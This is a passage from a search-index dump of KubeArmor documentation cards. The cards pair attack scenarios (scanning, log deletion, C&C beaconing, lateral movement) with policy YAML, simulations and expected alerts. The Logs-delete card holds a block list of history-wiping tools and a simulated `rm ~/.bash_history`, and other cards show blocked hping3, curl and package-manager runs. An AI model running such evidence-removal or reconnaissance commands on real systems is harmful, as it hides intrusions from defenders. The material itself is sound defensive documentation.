measure</p>"},{"location":"use-cases/cards/ICMP-control/#attack-scenario","title":"Attack Scenario","text":"<p>Adversaries may use scanning tools that utilize Internet Control Message Protocol (ICMP) to perform reconnaissance against a target network and identify potential loopholes. It's crucial to monitor network traffic and take proactive measures to prevent these attacks from occurring, such as implementing proper firewall rules and network segmentation. Additionally, it's important to stay up-to-date with the latest security patches to prevent known vulnerabilities from being exploited. Attack Type Network Flood, DoS(Denial of Service) Actual Attack Ping of Death(PoD)</p>"},{"location":"use-cases/cards/ICMP-control/#compliance","title":"Compliance","text":"<ul> <li>ICMP Control</li> </ul>"},{"location":"use-cases/cards/ICMP-control/#policy","title":"Policy","text":""},{"location":"use-cases/cards/ICMP-control/#icmp-control_1","title":"ICMP Control","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: restrict-scanning-tools\n  namespace: default\nspec:\n  severity: 4\n  selector:\n    matchLabels:\n      app: nginx\n  network:\n    matchProtocols:\n    - protocol: icmp\n      fromSource:\n      - path: /usr/bin/ping\n    - protocol: udp\n      fromSource:\n      - path: /usr/bin/ping\n  action: Allow\n  message: Scanning tool has been detected\n</code></pre>"},{"location":"use-cases/cards/ICMP-control/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash\nroot@nginx-77b4fdf86c-x7sdm:/# hping3 www.google.com\nUnable to resolve 'www.google.com'\nroot@nginx-77b4fdf86c-x7sdm:/# hping3 127.0.0.1\nWarning: Unable to guess the output interface\n[get_if_name] socket(AF_INET, SOCK_DGRAM, 0): Permission denied\n[main] no such device\nroot@nginx-77b4fdf86c-x7sdm:/# ping google.com\nPING google.com (216.58.200.206) 56(84) bytes of data.\n64 bytes from nrt12s12-in-f206.1e100.net (216.58.200.206): icmp_seq=1 ttl=109 time=51.9 ms\n64 bytes from nrt12s12-in-f206.1e100.net (216.58.200.206): icmp_seq=2 ttl=109 time=60.1 ms\n^C\n--- google.com ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1002ms\nrtt min/avg/max/mdev = 51.917/56.005/60.094/4.088 ms\n</code></pre>"},{"location":"use-cases/cards/ICMP-control/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"0-trust\",\n  \"ContainerID\": \"20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3\",\n  \"ContainerImage\": \"docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755\",\n  \"ContainerName\": \"nginx\",\n  \"Data\": \"syscall=SYS_SOCKET\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 86904,\n  \"HostPPID\": 86860,\n  \"Labels\": \"app=nginx\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Network\",\n  \"Owner\": {\n    \"Name\": \"nginx\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 1064,\n  \"PPID\": 1058,\n  \"ParentProcessName\": \"/usr/bin/bash\",\n  \"PodName\": \"nginx-77b4fdf86c-x7sdm\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/sbin/hping3\",\n  \"Resource\": \"domain=AF_INET type=SOCK_DGRAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/usr/sbin/hping3 www.google.com\",\n  \"Timestamp\": 1696593032,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-06T11:50:32.098937Z\",\n  \"cluster_id\": \"4291\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Logs-delete/","title":"Logs delete","text":"<p>Do not allow external tooling to delete logs/traces of critical components.</p>"},{"location":"use-cases/cards/Logs-delete/#narrative","title":"Narrative","text":"<p>Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.</p>"},{"location":"use-cases/cards/Logs-delete/#attack-scenario","title":"Attack Scenario","text":"<p>It's important to note that removal of indicators related to intrusion activity may interfere with event collection, reporting, or other processes used to detect such activity. This can compromise the integrity of security solutions by causing notable events to go unreported. Additionally, this activity may impede forensic analysis and incident response, due to a lack of sufficient data to determine what occurred. It's crucial to ensure that all relevant indicators are properly monitored and reported to prevent such issues from occurring. Attack Type Integrity Threats, Data Manipulation Actual Attack NetWalker, Conti, DarkSide RaaS</p>"},{"location":"use-cases/cards/Logs-delete/#compliance","title":"Compliance","text":"<ul> <li>CIS Distribution Independent Linuxv2.0</li> <li>Control-Id: 6.6</li> <li>Control-Id: 7.6.2</li> <li>Control-Id: 7.6.3</li> <li>NIST_800-53_CM-5</li> </ul>"},{"location":"use-cases/cards/Logs-delete/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Logs-delete/#logs-delete_1","title":"Logs delete","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: harden-nginx-shell-history-mod\n  namespace: default\nspec:\n  action: Block\n  file:\n    matchPaths:\n    - fromSource:\n      - path: /usr/bin/shred\n      - path: /usr/bin/rm\n      - path: /bin/mv\n      - path: /bin/rm\n      - path: /usr/bin/mv\n      path: /root/*_history\n    - fromSource:\n      - path: /usr/bin/shred\n      - path: /usr/bin/rm\n      - path: /bin/rm\n      - path: /bin/mv\n      - path: /usr/bin/mv\n      path: /home/*/*_history\n  message: Alert! shell history modification or deletion detected and prevented\n  process:\n    matchPaths:\n    - path: /usr/bin/shred\n    - path: /usr/bin/rm\n    - path: /bin/mv\n    - path: /bin/rm\n    - path: /usr/bin/mv\n  selector:\n    matchLabels:\n      app: nginx\n  severity: 5\n  tags:\n  - CIS\n  - NIST_800-53\n  - NIST_800-53_CM-5\n  - NIST_800-53_AU-6(8)\n  - MITRE_T1070_indicator_removal_on_host\n  - MITRE\n  - MITRE_T1036_masquerading\n</code></pre>"},{"location":"use-cases/cards/Logs-delete/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash\nroot@nginx-77b4fdf86c-x7sdm:/# rm ~/.bash_history\nrm: cannot remove '/root/.bash_history': Permission denied\nroot@nginx-77b4fdf86c-x7sdm:/# rm ~/.bash_history\nrm: cannot remove '/root/.bash_history': Permission denied\n</code></pre>"},{"location":"use-cases/cards/Logs-delete/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"0-trust\",\n  \"ContainerID\": \"20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3\",\n  \"ContainerImage\": \"docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755\",\n  \"ContainerName\": \"nginx\",\n  \"Data\": \"syscall=SYS_UNLINKAT flags=\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 43917,\n  \"HostPPID\": 43266,\n  \"Labels\": \"app=nginx\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"nginx\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 392,\n  \"PPID\": 379,\n  \"ParentProcessName\": \"/usr/bin/bash\",\n  \"PodName\": \"nginx-77b4fdf86c-x7sdm\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/bin/rm\",\n  \"Resource\": \"/root/.bash_history\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/usr/bin/rm /root/.bash_history\",\n  \"Timestamp\": 1696577978,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-06T07:39:38.182538Z\",\n  \"cluster_id\": \"4291\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Logs-delete/#references","title":"References","text":"<p>MITRE Indicator Removal</p>"},{"location":"use-cases/cards/Network-Access/","title":"Network Access","text":"<p>Prevent network access to any processes or selectively enable network access to specific processes.</p>"},{"location":"use-cases/cards/Network-Access/#narrative","title":"Narrative","text":"<p>Typically, within a pod/container, there are only specific processes that need to use network access. KubeArmor allows one to specify the set of binaries that are allowed to use network primitives such as TCP, UDP, and Raw sockets and deny everyone else.</p>"},{"location":"use-cases/cards/Network-Access/#attack-scenario","title":"Attack Scenario","text":"<p>In a possible attack scenario, an attacker binary may attempt to send a beacon to its Command and Control (C&amp;C) Server. Additionally, the binary may use network primitives to exfiltrate pod/container data and configuration. It's important to monitor network traffic and take proactive measures to prevent these attacks from occurring, such as implementing proper access controls and segmenting the network. Attack Type Denial of Service(DoS), Distributed Denial of Service(DDoS) Actual Attack DDoS attacks on websites of public institutions in Belgium, DDoS attack on the website of a city government in Germany</p>"},{"location":"use-cases/cards/Network-Access/#compliance","title":"Compliance","text":"<ul> <li>Network Access</li> </ul>"},{"location":"use-cases/cards/Network-Access/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Network-Access/#network-access_1","title":"Network Access","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: restrict-proccess\n  namespace: default\nspec:\n  severity: 4\n  selector:\n    matchLabels:\n      app: nginx\n  network:\n    matchProtocols:\n    - protocol: tcp\n      fromSource:\n      - path: /usr/bin/wget\n    - protocol: udp\n      fromSource:\n      - path: /usr/bin/wget\n  action:\n    Allow\n</code></pre>"},{"location":"use-cases/cards/Network-Access/#simulation","title":"Simulation","text":"<p>Set the default security posture to default-deny</p> <pre><code>kubectl annotate ns default kubearmor-network-posture=block --overwrite\n</code></pre> <pre><code>kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash\nroot@nginx-77b4fdf86c-x7sdm:/# curl www.google.com\ncurl: (6) Could not resolve host: www.google.com\nroot@nginx-77b4fdf86c-x7sdm:/# wget https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql/original/wordpress-mysql-deployment.yaml\n--2023-10-06 11:08:58--  https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql/original/wordpress-mysql-deployment.yaml\nResolving github.com (github.com)... 20.207.73.82\nConnecting to github.com (github.com)|20.207.73.82|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 15051 (15K) [text/plain]\nSaving to: 'wordpress-mysql-deployment.yaml.2'\n\nwordpress-mysql-deployment.ya 100%[=================================================&gt;]  14.70K  --.-KB/s    in 0.08s\n\n2023-10-06 11:08:59 (178 KB/s) - 'wordpress-mysql-deployment.yaml.2' saved [15051/15051]\n</code></pre>"},{"location":"use-cases/cards/Network-Access/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"0-trust\",\n  \"ContainerID\": \"20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3\",\n  \"ContainerImage\": \"docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755\",\n  \"ContainerName\": \"nginx\",\n  \"Data\": \"syscall=SYS_SOCKET\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 73952,\n  \"HostPPID\": 73945,\n  \"Labels\": \"app=nginx\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Network\",\n  \"Owner\": {\n    \"Name\": \"nginx\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 532,\n  \"PPID\": 525,\n  \"ParentProcessName\": \"/usr/bin/bash\",\n  \"PodName\": \"nginx-77b4fdf86c-x7sdm\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/bin/curl\",\n  \"Resource\": \"domain=AF_INET type=SOCK_DGRAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/usr/bin/curl www.google.com\",\n  \"Timestamp\": 1696588301,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-06T10:31:41.935146Z\",\n  \"cluster_id\": \"4291\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Network-Segmentation/","title":"Network Segmentation","text":"<p>Limit network access strictly between whitelisted service endpoints, deny everything else.</p>"},{"location":"use-cases/cards/Network-Segmentation/#narrative","title":"Narrative","text":"<p>In Kubernetes, by default all the pods are able to communicate with all the other pods present in the cluster. This increases the security risk associated with the intrusion of an attacker as this model allows easy access to all endpoints. Network segmentation deals with dividing this network into segments and reducing the connections that are allowed.</p>"},{"location":"use-cases/cards/Network-Segmentation/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker can gain access to a vulnerable pod and then try to access the other pods by lateral movement through the network. This can be prevented by using network segmentation policies which restrict the connections to only those that are strictly necessary for the particular application to function. Attack Type Pivoting, Denial of service(DoS)</p>"},{"location":"use-cases/cards/Network-Segmentation/#compliance","title":"Compliance","text":"<ul> <li>Network Segmentation</li> </ul>"},{"location":"use-cases/cards/Network-Segmentation/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Network-Segmentation/#network-micro-segmentation","title":"Network micro-segmentation","text":"<pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: autopol-ingress-564878049\n  namespace: wordpress-mysql\nspec:\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          app: wordpress\n    ports:\n    - port: 3306\n      protocol: TCP\n  podSelector:\n    matchLabels:\n      app: mysql\n  policyTypes:\n  - Ingress\n</code></pre>"},{"location":"use-cases/cards/Network-Segmentation/#simulation","title":"Simulation","text":"<p>Before applying the policy all network connections to the mysql pod is permitted from other pods and the attacker can use ICMP for discovery</p> <pre><code>vagrant@master-node:\u2014$ kubectl exec -it wordpress-fb448db97-46rrn -n wordpress-mysql -- /bin/bash \nroot@wordpress-fb448db97-46rrn:/var/www/html# ping 10.0.0.10 \nPING 10.0.0.10 (10.0.0.10): 56 data bytes \n64 bytes from 10.0.0.10: icmp_seq=0 tt1=64 time=0.078 ms\n64 bytes from 10.0.0.10: icmp_seq=1 tt1=64 time=0.156 ms \n64 bytes from 10.0.0.10: icmp_seq=2 tt1=64 time=0.090 ms \n64 bytes from 10.0.0.10: icmp_seq=3 tt1=64 time=0.037 ms \n64 bytes from 10.0.0.10: icmp_seq=4 tt1=64 time=0.123 ms \n64 bytes from 10.0.0.10: icmp_seq=5 tt1=64 time=0.117 ms \n64 bytes from 10.0.0.10: icmp_seq=6 tt1=64 time=0.108 ms \n64 bytes from 10.0.0.10: icmp_seq=7 tt1=64 time=0.148 ms \n64 bytes from 10.0.0.10: icmp_seq=8 tt1=64 time=0.153 ms \n^C--- 10.0.0.10 ping statistics ---\n9 packets transmitted, 9 packets received, 0% packet loss \nround-trip min/avg/max/stddev = 0.037/0.112/0.156/0.037 ms \nroot@worderess-fb448db97-46rrn:/var/www/html# \n</code></pre> <p>After applying the policy, all other connections than the one defined will be dropped</p> <pre><code>vagrant@master-node:\u2014$ kubectl exec -it wordpress-fb448db97-42k66 -n wordpress-mysql -- /bin/bash \nroot@wordpress-fb448db97-42k6S:/var/www/html# ping 10.0.0.10 \nPING 10.0.0.10 (10.0.0.10): 56 data bytes \n92 bytes from 10.0.0.10: Destination Port Unreachable \n92 bytes from 10.0.0.10: Destination Port Unreachable \n92 bytes from 10.0.0.10: Destination Port Unreachable \n92 bytes from 10.0.0.10: Destination Port Unreachable \n92 bytes from 10.0.0.10: Destination Port Unreachable \n92 bytes from 10.0.0.10: Destination Port Unreachable \n^C--- 10.0.0.10 ping statistics ---\n6 packets transmitted, 0 packets received, 100% packet loss \nroot@wordpress-fb448db97-42k66:/var/www/html# \nroot@wordpress-fb448db97-42k6S:/var/www/html# curl 10.0.0.10 \ncurl: (7) Failed to connect to 10.0.0.10 port 80: Connection refused \nroot@wordpress-fb448db97-42k6S:/var/www/html# \n</code></pre>"},{"location":"use-cases/cards/Network-forensics/","title":"Network forensics","text":"<p>Get granular details of all the network accesses within the target workloads.</p>"},{"location":"use-cases/cards/Network-forensics/#narrative","title":"Narrative","text":"<p>KubeArmor helps the organization to protect their Network level acceass from the attackers by  continuous Monitoring and Alerting the access when it's happening.</p>"},{"location":"use-cases/cards/Network-forensics/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker can scan the open ports on a system by sending connection requests to a wide range of ports. This can be detected by monitoring for a large number of connection attempts to a variety of ports in a short period of time.</p>"},{"location":"use-cases/cards/Network-forensics/#compliance","title":"Compliance","text":"<ul> <li>NIST-800</li> <li>NIST_SA</li> </ul>"},{"location":"use-cases/cards/Network-forensics/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Network-forensics/#network-forensics_1","title":"Network Forensics","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-nist-ac-18-1-network-audit\n  namespace: wordpress-mysql\nspec:\n  severity: 3\n  tags: [\"NIST-800\", \"AC-18(1)\", \"Networking\", \"Access\", \"NIST_SA\", \"NIST_SA-20\", \"NIST_SA-20-Customized Development of Critical Components\", \"SA\"]\n  message: \"Access to network files detected. Possible violation of NIST Controls\"\n  selector:\n    matchLabels:\n      app: wordpress\n  file:\n    matchPaths:\n      - path: /proc/net/tcp\n      - path: /proc/net/udp\n      - path: /proc/net/icmp\n      - path: /proc/net/snmp\n      - path: /proc/net/route\n      - path: /proc/net/dev\n      - path: /var/log/syslog\n      - path: /var/log/audit/audit.log\n      - path: /etc/hostapd/hostapd.conf\n      - path: /etc/network/if-up.d\n  action: Audit\n</code></pre>"},{"location":"use-cases/cards/Network-forensics/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it wordpress-7c966b5d85-wvtln -n wordpress-mysql -- bash\nroot@wordpress-7c966b5d85-wvtln:/var/www/html# cd /etc/network/if-up.d\nroot@wordpress-7c966b5d85-wvtln:/etc/network/if-up.d# ls\nmountnfs\n</code></pre>"},{"location":"use-cases/cards/Network-forensics/#expected-alert","title":"Expected Alert","text":"<pre><code>ClusterName: default\nHostName: gke-cluster-1-default-pool-37f4c896-8cn6\nNamespaceName: wordpress-mysql\nPodName: wordpress-7c966b5d85-wvtln\nLabels: app=wordpress\nContainerName: wordpress\nContainerID: 6d09394a988c5cf6b9fe260d28fdd57d6ff281618869a173965ecd94a3efac44\nContainerImage: docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\nType: MatchedPolicy\nPolicyName: ksp-nist-ac-18-1-network-audit\nSeverity: 3\nMessage: Access to network files detected. Possible violation of NIST Controls\nSource: /bin/ls\nResource: /etc/network/if-up.d\nOperation: File\nAction: Audit\nData: syscall=SYS_OPENAT fd=-100 flags=O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC\nEnforcer: eBPF Monitor\nResult: Passed\nATags: [NIST-800 AC-18(1) Networking Access NIST_SA NIST_SA-20 NIST_SA-20-Customized Development of Critical Components SA]\nHostPID: 1.275441e+06\nHostPPID: 1.275298e+06\nOwner: map[Name:wordpress Namespace:wordpress-mysql Ref:Deployment]\nPID: 342\nPPID: 336\nParentProcessName: /bin/bash\nProcessName: /bin/ls\nTags: NIST-800,AC-18(1),Networking,Access,NIST_SA,NIST_SA-20,NIST_SA-20-Customized Development of Critical Components,SA\n</code></pre>"},{"location":"use-cases/cards/Network-forensics/#references","title":"References","text":"<p>NIST Special Publication 800-series</p>"},{"location":"use-cases/cards/Packaging-tools/","title":"Packaging tools","text":"<p>Deny execution of package management tools</p>"},{"location":"use-cases/cards/Packaging-tools/#narrative","title":"Narrative","text":"<p>Pods/Containers might get shipped with binaries which should never used in the production environments. Some of those bins might be useful in dev/staging environments but the same container image is carried forward in most cases to the production environment too. For security reasons, the devsecops team might want to disable the use of these binaries in the production environment even though the bins exists in the container. As an example, most of the container images are shipped with package management tools such as apk, apt, yum, etc. If anyone ends up using these bins in the prod env, it will increase the attack surface of the container/pod.</p>"},{"location":"use-cases/cards/Packaging-tools/#attack-scenario","title":"Attack Scenario","text":"<p>In an attack scenario, adversaries may use system tools such as fsck, ip, who, apt, and others for reconnaissance and to download additional tooling from remote servers. These tools can help them gain valuable information about the system and its vulnerabilities, allowing them to carry out further attacks. It's important to be vigilant about such activities and implement security measures to prevent such attacks from happening. Attack Type Command Injection, Malware, Backdoor Actual Attack  AppleJeus, Codecov supply chain</p>"},{"location":"use-cases/cards/Packaging-tools/#compliance","title":"Compliance","text":"<ul> <li>CIS Distribution Independent Linuxv2.0</li> <li>Control-Id:6.4.5</li> <li>NIST_800-53_SI-4</li> <li>NIST_800-53_CM-7(4)</li> </ul>"},{"location":"use-cases/cards/Packaging-tools/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Packaging-tools/#packaging-tools-execution","title":"Packaging tools execution","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: harden-mysql-pkg-mngr-exec\n  namespace: wordpress-mysql\nspec:\n  action: Block\n  message: Alert! Execution of package management process inside container is denied\n  process:\n    matchPaths:\n    - path: /usr/bin/apt\n    - path: /usr/bin/apt-get\n    - path: /bin/apt-get\n    - path: /sbin/apk\n    - path: /bin/apt\n    - path: /usr/bin/dpkg\n    - path: /bin/dpkg\n    - path: /usr/bin/gdebi\n    - path: /bin/gdebi\n    - path: /usr/bin/make\n    - path: /bin/make\n    - path: /usr/bin/yum\n    - path: /bin/yum\n    - path: /usr/bin/rpm\n    - path: /bin/rpm\n    - path: /usr/bin/dnf\n    - path: /bin/dnf\n    - path: /usr/bin/pacman\n    - path: /usr/sbin/pacman\n    - path: /bin/pacman\n    - path: /sbin/pacman\n    - path: /usr/bin/makepkg\n    - path: /usr/sbin/makepkg\n    - path: /bin/makepkg\n    - path: /sbin/makepkg\n    - path: /usr/bin/yaourt\n    - path: /usr/sbin/yaourt\n    - path: /bin/yaourt\n    - path: /sbin/yaourt\n    - path: /usr/bin/zypper\n    - path: /bin/zypper\n  selector:\n    matchLabels:\n      app: mysql\n  severity: 5\n  tags:\n  - NIST\n  - NIST_800-53_CM-7(4)\n  - SI-4\n  - process\n  - NIST_800-53_SI-4\n</code></pre>"},{"location":"use-cases/cards/Packaging-tools/#simulation","title":"Simulation","text":"<pre><code>kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash\nroot@mysql-74775b4bf4-65nqf:/# apt\nbash: /usr/bin/apt: Permission denied\nroot@mysql-74775b4bf4-65nqf:/# apt-get\nbash: /usr/bin/apt-get: Permission denied\n</code></pre>"},{"location":"use-cases/cards/Packaging-tools/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"ATags\": [\n    \"NIST\",\n    \"NIST_800-53_CM-7(4)\",\n    \"SI-4\",\n    \"process\",\n    \"NIST_800-53_SI-4\"\n  ],\n  \"Action\": \"Block\",\n  \"ClusterName\": \"aditya\",\n  \"ContainerID\": \"b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4\",\n  \"ContainerImage\": \"docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae\",\n  \"ContainerName\": \"mysql\",\n  \"Data\": \"syscall=SYS_EXECVE\",\n  \"Enforcer\": \"AppArmor\",\n  \"HashID\": \"dd573c234f68b8df005e8cd314809c8b2a23852230d397743e348bf4a03ada3f\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 21894,\n  \"HostPPID\": 16435,\n  \"Labels\": \"app=mysql\",\n  \"Message\": \"Alert! Execution of package management process inside container is denied\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"Process\",\n  \"Owner\": {\n    \"Name\": \"mysql\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 168,\n  \"PPID\": 160,\n  \"PodName\": \"mysql-74775b4bf4-65nqf\",\n  \"PolicyName\": \"harden-mysql-pkg-mngr-exec\",\n  \"ProcessName\": \"/usr/bin/apt\",\n  \"Resource\": \"/usr/bin/apt\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"5\",\n  \"Source\": \"/bin/bash\",\n  \"Tags\": \"NIST,NIST_800-53_CM-7(4),SI-4,process,NIST_800-53_SI-4\",\n  \"Timestamp\": 1696318864,\n  \"Type\": \"MatchedPolicy\",\n  \"UID\": 0,\n  \"UpdatedTime\": \"2023-10-03T07:41:04.096412Z\",\n  \"cluster_id\": \"3896\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Packaging-tools/#references","title":"References","text":"<p>MITRE Installer PackagesCodecov Incident - A Supply Chain Attack</p>"},{"location":"use-cases/cards/Process-Whitelisting/","title":"Process Whitelisting","text":"<p>Allow only specific processes to execute, deny/audit everything else.</p>"},{"location":"use-cases/cards/Process-Whitelisting/#narrative","title":"Narrative","text":"<p>You can use a security feature called \"process isolation\" or \"process whitelisting\" to set specific processes to be executed as part of a container or pod and deny everything else. This can help to secure a containerized environment by limiting the processes that can run within it and preventing unauthorized processes from being executed.</p>"},{"location":"use-cases/cards/Process-Whitelisting/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker uses command injection techniques to insert binaries in the pods/workloads and then execute the binary. Process-Whitelisting will deny any unknown process from execution. Attack Type Credential Access, Command Injection</p>"},{"location":"use-cases/cards/Process-Whitelisting/#compliance","title":"Compliance","text":"<ul> <li>Process Whitelisting</li> </ul>"},{"location":"use-cases/cards/Process-Whitelisting/#policy","title":"Policy","text":""},{"location":"use-cases/cards/Process-Whitelisting/#process-whitelisting_1","title":"Process Whitelisting","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: allow-specific-process\n  namespace: default\nspec:\n  action: Allow\n  file:\n    matchDirectories:\n      - dir: /\n        recursive: true\n  process:\n    matchPaths:\n      - path: /bin/bash\n      - fromSource:\n          - path: /bin/dash\n        path: /bin/ping\n      - fromSource:\n          - path: /usr/sbin/apache2\n        path: /bin/sh\n      - path: /usr/sbin/apache2\n  selector:\n    matchLabels:\n      app: dvwa-web\n      tier: frontend\n  severity: 1\n</code></pre>"},{"location":"use-cases/cards/Process-Whitelisting/#simulation","title":"Simulation","text":"<p>Set the default security posture to default-deny</p> <pre><code>kubectl annotate ns default kubearmor-file-posture=block --overwrite\n</code></pre> <pre><code>kubectl exec -it dvwa-web-566855bc5b-xtgwq -- bash\nroot@dvwa-web-566855bc5b-xtgwq:/var/www/html# ping\nbash: /bin/ping: Permission denied\n</code></pre>"},{"location":"use-cases/cards/Process-Whitelisting/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"0-trust\",\n  \"ContainerID\": \"20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3\",\n  \"ContainerImage\": \"docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755\",\n  \"ContainerName\": \"nginx\",\n  \"Data\": \"syscall=SYS_SOCKET\",\n  \"Enforcer\": \"eBPF Monitor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 84245,\n  \"HostPPID\": 84127,\n  \"Labels\": \"app=nginx\",\n  \"NamespaceName\": \"default\",\n  \"Operation\": \"Network\",\n  \"Owner\": {\n    \"Name\": \"nginx\",\n    \"Namespace\": \"default\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 1032,\n  \"PPID\": 1023,\n  \"ParentProcessName\": \"/usr/bin/bash\",\n  \"PodName\": \"nginx-77b4fdf86c-x7sdm\",\n  \"PolicyName\": \"DefaultPosture\",\n  \"ProcessName\": \"/usr/bin/ping\",\n  \"Resource\": \"domain=AF_INET type=SOCK_DGRAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0\",\n  \"Result\": \"Permission denied\",\n  \"Source\": \"/usr/bin/ping www.google.com\",\n  \"Timestamp\": 1696591999,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-06T11:33:19.956684Z\",\n  \"cluster_id\": \"4291\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Process-based-asset-access/","title":"Process based asset access","text":"<p>Allow only specific processes to access sensitive assets, deny/audit everything else.</p>"},{"location":"use-cases/cards/Process-based-asset-access/#narrative","title":"Narrative","text":"<p>You can use a security feature called \"process isolation\" or \"process whitelisting\" to set specific processes to access specific assets in a container or pod and deny everything else. This can help to secure a containerized environment by limiting the processes that can access the assets within it and preventing unauthorized processes from accessing those 